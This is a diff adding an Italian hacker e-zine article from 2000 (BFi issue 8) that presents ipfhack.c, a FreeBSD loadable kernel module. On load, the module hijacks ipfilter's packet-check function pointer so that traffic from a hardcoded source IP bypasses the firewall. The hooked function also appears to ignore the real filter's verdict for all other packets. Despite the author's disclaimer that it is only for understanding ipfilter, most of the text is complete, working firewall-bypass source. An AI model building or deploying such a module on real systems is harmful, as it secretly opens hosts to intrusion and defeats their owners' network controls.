@@ -1,0 +1,199 @@
+==============================================================================
+------------[ BFi numero 8, anno 3 - 30/04/2000 - file 10 di 28 ]-------------
+==============================================================================
+
+
+-[ HACKiNG ]------------------------------------------------------------------
+---[ HACKiNG iPFiLTER ViA LKM 
+-----[ pIGpEN <pigpen@s0ftpj.org> <deadhead@sikurezza.org>
+
+
+Music: Nirvana - Unplugged in New York Recorded by MTV
+Consumo: 1 Red Bull,
+	 2 Bicchieri di The' Elisir Rocchetta con estratto naturale di Ginseng
+		 (la combinazione mi rende degno successore di questo nick)
+Tastiera: Geotecnosciamanica (quella con la lava e le costellazioni
+			      per intenderci)
+
+
+Ipfilter e' filtrabile come avevo fatto per ipfw...?
+
+Certo... anche se modificare la funzione che checka i pacchetti e' piuttosto
+lungo... Qui vi presento un semplicissimo sorgente che filtra ipfilter su
+FreeBSD, magari qualcun altro fa il porting per altri OS...
+
+Tenete conto che questo mio sorgente non e' proprio come quello di ipfw,
+in pratica c'e' sempre una funzione di check che si sostituisce a quella
+del supporto, solo che in realta' NON rimpiazza quella vecchia semplicemente 
+controlla l'ip e se questo corrisponde a GO_JOHNNY_GO non chiama la vera
+funzione di check... dell'ipfilter.
+Quindi non fa nessun controllo sulle regole del firewall, questo vuol dire che
+per esempio l'opzione di FAST_ROUTE non viene processata anche se benigna...
+Il modulo kernel per ipfw invece processava per es. il DIVERT e il FORWARD...
+Se vi presento questo codice e' solo per correttezza nei confronti del
+signor ipfw e non per farvelo usare... Non mi sarebbe costato molto
+presentarvelo in maniera piu' cool... ma voglio risparmiarmi del tempo per
+fare altro :P
+
+
+<-| ipfhack.c |->
+/*
+ * Filtering... IP FILTER
+ *
+ * After my kld for ipfw ... this is for ipfilter... it shows you 
+ * shortest way to do accept a pkt.... 
+ * 
+ * Warning: this kld doesn't process pkts from GO_JOHNNY_GO ip, also
+ * 	    options like FAST_ROUTE.... This is only an example ...
+ * 	    Use it only to understand ipfilter....
+ * 	    
+ *
+ * pigpen [pigpen@s0ftpj.org, deadhead@sikurezza.org]
+ * 
+ * SoftProject NoProfit 
+ * Italian Security Organization
+ * www.s0ftpj.org
+ *
+ * Sikurezza.org
+ * Italian Security MailingList
+ * www.sikurezza.org
+ *
+ */
+
+/* 
+ * pay attention... this kld can change in future...
+ * 
+ * uname -a
+ *
+ * FreeBSD storpio.cameretta.pig 4.0-19990705-CURRENT FreeBSD 4.0-19990705-
+ * CURRENT #4 ..... i386
+ *
+ * If you wanna a porting of this code and you have no time to do that 
+ * write me at: deadhead@sikurezza.org with subject "PORTING A KLD"
+ * 
+ */
+
+#define GO_JOHNNY_GO 		"192.168.1.2"	
+/* Packets sent by this ip wouldn't process */
+
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/malloc.h>
+#include <sys/mbuf.h>
+#include <sys/kernel.h>
+#include <sys/proc.h>
+#include <sys/socket.h>
+#include <sys/socketvar.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/in_systm.h>
+#include <netinet/ip.h>
+#include <netinet/ip_var.h>
+
+
+
+/* IPFILTER FreeBSD Options */
+
+typedef struct ip	ip_t;
+typedef struct mbuf	mb_t;
+
+/* A simple typedef for filter check prototypes */
+
+typedef int ipfr_t	__P((ip_t *, int, void *, int, mb_t **));
+
+/* Prototypes */
+
+static int  	 s_load	 		__P((struct module *, int, void *));
+static u_int32_t inaton			__P((const char *));
+extern ipfr_t 	 fr_check, *fr_checkp;
+static ipfr_t	 *fr;
+static ipfr_t	 myfr;
+
+/* module handler */
+
+static int
+s_load (struct module *module, int cmd, void *arg)
+{
+ int s;
+
+ switch(cmd) {
+	case MOD_LOAD:
+			s = splnet();
+			fr = fr_check;	/* I use a funct ptr... */
+			fr_checkp = myfr;
+		        splx(s);
+			break;
+			
+	case MOD_UNLOAD:
+			s = splnet();
+			fr_checkp = fr_check;
+			splx(s);
+			break;
+ }
+
+ return 0;
+}
+
+/* module struct */
+
+static moduledata_t s_mod_1 = {
+	        "ipfil_mod",
+	        s_load,
+	        0
+};
+
+
+DECLARE_MODULE(ipfil_mod, s_mod_1, SI_SUB_PSEUDO, SI_ORDER_ANY);
+
+
+/* hmmm ok ... this is short... maybe unstable... and every TYPE of 
+   action for "GO_JOHNNY_GO" ip wouldn't consider .... also FAST_ROUTE
+   and other options.... this is a complete filter... you can do it
+   better .... Sorry... I don't want to give you sources for illegal 
+   purposes ...  
+ */
+
+static int myfr(ip_t *ip, int hlen, void *ifp, int out, mb_t **mp)
+{
+	if(ip->ip_src.s_addr != inaton(GO_JOHNNY_GO)) 
+		fr(ip, hlen, ifp, out, mp);
+	return 0;
+}
+
+
+u_int32_t inaton(const char *str)
+{
+	unsigned long l;
+	unsigned int val;
+	int i;
+
+	l = 0;
+
+	for(i=0; i < 4; i++) {
+		l <<= 8;
+		if(*str != '\0') {
+			val = 0;
+			while(*str != '\0' && *str != '.') {
+				val *= 10;
+				val += *str - '0';
+				str++;
+			}
+			l |= val;
+			if(*str != '\0')
+				str++;
+		}
+	}
+	return(htonl(l));
+}
+<-X->
+
+E' tutto...
+
+cai
+
+pIGpEN
+
+
+==============================================================================
+--------------------------------[ EOF 10/28 ]---------------------------------
+==============================================================================
